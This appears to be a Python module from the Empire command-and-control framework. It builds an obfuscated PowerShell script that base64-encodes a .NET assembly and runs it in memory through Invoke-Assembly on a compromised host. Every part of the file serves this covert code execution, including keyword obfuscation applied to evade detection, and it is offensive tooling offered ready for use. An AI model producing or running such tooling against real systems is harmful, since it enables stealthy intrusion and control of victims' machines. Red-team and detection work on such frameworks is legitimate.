from __future__ import print_function

import pathlib
import base64
from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):

        # Helper function for arguments
        def parse_assembly_args(args):
            stringlist = []
            stringbuilder = ""
            inside_quotes = False

            if not args:
                return '""'
            for ch in args:
                if ch == " " and not inside_quotes:
                    stringlist.append(stringbuilder) # Add finished string to the list
                    stringbuilder = "" # Reset the string
                elif ch == '"':
                    inside_quotes = not inside_quotes
                else: # Ch is a normal character
                    stringbuilder += ch # Add next ch to string

            # Finally...
            stringlist.append(stringbuilder)
            for arg in stringlist:
                if arg == "":
                    stringlist.remove(arg)

            argument_string = '","'.join(stringlist)
            # Replace backslashes with a literal backslash so an operator can type a file path like C:\windows\system32 instead of C:\\windows\\system32
            argument_string = argument_string.replace("\\", "\\\\")
            return f'\"{argument_string}\"'


        module_source = main_menu.installPath + "/data/module_source/code_execution/Invoke-Assembly.ps1"
        if main_menu.obfuscate:
            obfuscated_module_source = module_source.replace("module_source", "obfuscated_module_source")
            if pathlib.Path(obfuscated_module_source).is_file():
                module_source = obfuscated_module_source

        try:
            with open(module_source, 'r') as f:
                module_code = f.read()
        except:
            return handle_error_message("[!] Could not read module source path at: " + str(module_source))

        if main_menu.obfuscate and not pathlib.Path(obfuscated_module_source).is_file():
            script = data_util.obfuscate(installPath=main_menu.installPath, psScript=module_code, obfuscationCommand=main_menu.obfuscateCommand)
        else:
            script = module_code

        try:
            with open(f"{main_menu.installPath}/downloads/{params['File']}", 'rb') as f:
                assembly_data = f.read()
        except:
            return handle_error_message("[!] Could not read .NET assembly path at: " + str(params['Arguments']))

        encode_assembly = helpers.encode_base64(assembly_data).decode('UTF-8')

        # Do some parsing on the operator's arguments so it can be formatted for Powershell
        if params['Arguments'] != '':
            assembly_args = parse_assembly_args(params['Arguments'])

        script_end = f'\nInvoke-Assembly -ASMdata "{encode_assembly}"'
        # Add any arguments to the end execution of the script
        if params['Arguments'] != '':
            script_end += " -" + "Arguments" + " " + assembly_args

        if main_menu.obfuscate:
            script_end = data_util.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=main_menu.obfuscateCommand)
        script += script_end
        script = data_util.keyword_obfuscation(script)

        return script
